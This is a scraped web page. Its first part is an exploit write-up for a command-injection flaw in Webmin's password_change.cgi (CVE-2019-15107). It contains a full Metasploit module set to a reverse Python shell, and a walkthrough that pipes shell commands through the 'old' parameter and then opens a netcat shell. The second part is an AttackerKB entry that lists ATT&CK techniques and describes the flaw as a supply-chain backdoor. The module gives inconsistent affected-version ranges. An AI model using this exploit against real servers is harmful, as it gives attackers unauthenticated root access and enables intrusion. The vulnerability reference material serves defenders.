- [Press News (zdnet)](https://www.zdnet.com/article/backdoor-found-in-webmin-a-popular-web-based-utility-for-managing-unix-servers/)
- [Security alert from Tenable](https://www.tenable.com/blog/cve-2019-15107-exploit-modules-available-for-remote-code-execution-vulnerability-in-webmin)
## Webmin <= 1.920 - Unauthenticated RCE

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin 1.882 <= 1921 Unauthenticated RCE',
      'Description'    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.920 and prior versions. If the password change module is turned on, the unathenticated user
        can execute arbitrary commands with root privileges.

        Webmin 1.890 is vulnerable in the default configuration, while the other affected versions
        require the âuser password changeâ option to be enabled.

        /////// This 0day has been published at DEFCON-AppSec Village. ///////

      ),
      'Author'         => [
        'AkkuS <Ãzkan Mustafa AkkuÅ>' # Discovery & PoC & Metasploit module @ehakkus
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2019-'],
          ['URL', 'https://www.pentest.com.tr']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_python'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.910', {}]],
      'DisclosureDate' => 'May 16 2019',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end
  ##
  # Target and input verification
  ##
  def check
    # check passwd change priv
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, "password_change.cgi"),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'cookie'  => "redirect=1; testing=1; sid=x; sessiontest=1"
    })

    if res && res.code == 200 && res.body =~ /Failed/
      res = send_request_cgi(
        {
        'method' => 'POST',
        'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
        'headers' =>
          {
            'Referer' => "#{peer}/session_login.cgi"
          },
        'data' => "user=root&pam=&expired=2&old=AkkuS%7cdir%20&new1=akkuss&new2=akkuss"
        })

      if res && res.code == 200 && res.body =~ /password_change.cgi/
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    else
      return CheckCode::Safe
    end
  end

  ##
  # Exploiting phase
  ##
  def exploit

    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    command = payload.encoded
    print_status("Attempting to execute the payload...")
    handler

    res = send_request_cgi(
      {
      'method' => 'POST',
      'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
      'ctype'  => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'data' => "user=root&pam=&expired=2&old=AkkuS%7c#{command}%20&new1=akkuss&new2=akkuss"
      })

  end
end

```
in webmin, the "user password change" must be allowed for the exploit vulnerability.
this is the only condition. Many webmin managers enable this feature. They allows users to set a new password with the old password.
Let's take a closer look at this.Webmin 1.890 is vulnerable in the default configuration, while the other affected versions
require the âuser password changeâ option to be enabled.While researching on the Webmin application, I noticed some interesting ".cgi" files. One of them is "password\_change.cgi"![](../images/defwebmin20-1.png)There is only one requirement for the parameters in this file to work, that the "passwd\_mode" value in the "miniserv.conf" configuration file is set to "2".
```

$miniserv{'passwd_mode'} == 2 || die "Password changing is not enabled!";

```
![](../images/defwebmin20-2.png)So how does the administrator activate this configuration? let's check...In the "Webmin> Webmin Configuration> Authentication" section, "Prompt users with expired passwords to enter a new one" should be checked. This means a value of "2" for "password\_change" in "miniserv.conf".![](../images/defwebmin20-3.png)After this configuration, users can change their expired password by verifying their old password.So where exactly is the vulnerability? Let's back to "password\_change.cgi".![](../images/defwebmin20-4.png)"password\_change.cgi" sends the old password to "encrypt\_password" function in "acl/acl-lib.pl"This function calls the other function "unix\_crypt".In another section, the same function "unix\_crypt" is called again for "Validate old password".![](../images/defwebmin20-5.png)At this point, we will use "vertical bar (|)" by reading the shadow file during validating the old password.Let's look at this by sending a request with the burp suite.![](../images/defwebmin20-6.png)We sent a request with an ordinary "POST" data, and naturally gave an error "Failed to change password: The current password is incorrect".The vulnerability is exactly included in the "old" parameter.It doesn't matter if the username, old password or other information is correct.The file "password\_change.cgi" will check the information in the "old" parameter on the server. It won't even check if the username is correct or not.we will now use "vertical bar (|)" and try to run a different command on the server.![](../images/defwebmin20-7.png)As you can see, the command "ifconfig" is executed by the server and the output is shown.Now let's send a malicious payload to the server and receive shell session.I'll use "netcat" payload for proof. Because I know there is netcat on the server.![](../images/defwebmin20-8.png)![](../images/defwebmin20-9.png)As you can see the shell was received. When we run the command "pwd", we can see that the malicious payload is executed in the "acl" folder. Because the function is called here.![](../images/defwebmin20-15.png)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

Â© Copyright, 2017 | Sponsored by- [National Keep](https://nationalkeep.com)



=== Content from attackerkb.com_0c825e0e_20250121_002238.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
##### Very High

39

### Webmin password\_change.cgi Command Injection

39

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
###### Very High

(9 users assessed)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Exploitability
###### Very High

(9 users assessed)

User Interaction
###### Unknown

Privileges Required
###### Unknown

Attack Vector
###### Unknown

39

# Webmin password\_change.cgi Command Injection

Disclosure Date: August 16, 2019
•Last updated February 28, 2020
[CVE-2019-15107](/search?q=CVE-2019-15107)

Exploited in the Wild

Reported by [gdft2112](/contributors/gdft2112)  [and 1 more...](#exploited-in-the-wild)

[View Source Details](#exploited-in-the-wild)

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.
Execution
Techniques

Validation

Command and Scripting Interpreter

Validated

Command and Scripting Interpreter: Unix Shell

Validated

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[exploit/linux/http/webmin\_backdoor](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb "exploit/linux/http/webmin_backdoor")

[CISA KEV Listed](/search?q=cisa_kev_listed&qt=tag)[Common in enterprise](/search?q=common_enterprise&qt=tag)[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

An issue was discovered in Webmin through 1.920. The parameter old in password\_change.cgi contains a command injection vulnerability.

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)

## Add Assessment

[Log in to add an Assessment](/login)

15

[![](https://avatars.githubusercontent.com/u/4551878?v=4&s=50)](/contributors/wvu-r7)

**[wvu-r7 (437)](/contributors/wvu-r7)**
![](/static/public/img/Badges-100-assessments.svg)

![](/static/public/img/Badges-2nd-Place.svg)

[August 21, 2019 3:12am UTC (5 years ago)](/assessments/4601b37d-1e68-494e-be8b-c45be7ad424c)•Edited 1 year ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High
###### Technical Analysis

This was a supply chain attack: <http://www.webmin.com/exploit.html>. The backdoor was introduced in a version that was “exploitable” in the default install. Version 1.890 is the money. Anything after requires a non-default setting.

Note that SourceForge installs are affected, but GitHub checkouts aren’t.

ETA: Metasploit added an [exploit module](https://github.com/rapid7/metasploit-framework/pull/12219).

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/4601b37d-1e68-494e-be8b-c45be7ad424c)
[Delete Assessment and Exploited in the Wild Report](/assessments/4601b37d-1e68-494e-be8b-c45be7ad424c)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-4601b37d-1e68-494e-be8b-c45be7ad424c)

5

[![](https://avatars.githubusercontent.com/u/4108654?v=4&s=50)](/contributors/busterb)

**[busterb (317)](/contributors/busterb)**
![](/static/public/img/Badges-50-assessments.svg)

[August 20, 2019 6:37pm UTC (5 years ago)](/assessments/b13d216f-2a27-41b0-b1c2-5048e98bdedc)•Edited 4 years ago

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Very High
###### Technical Analysis

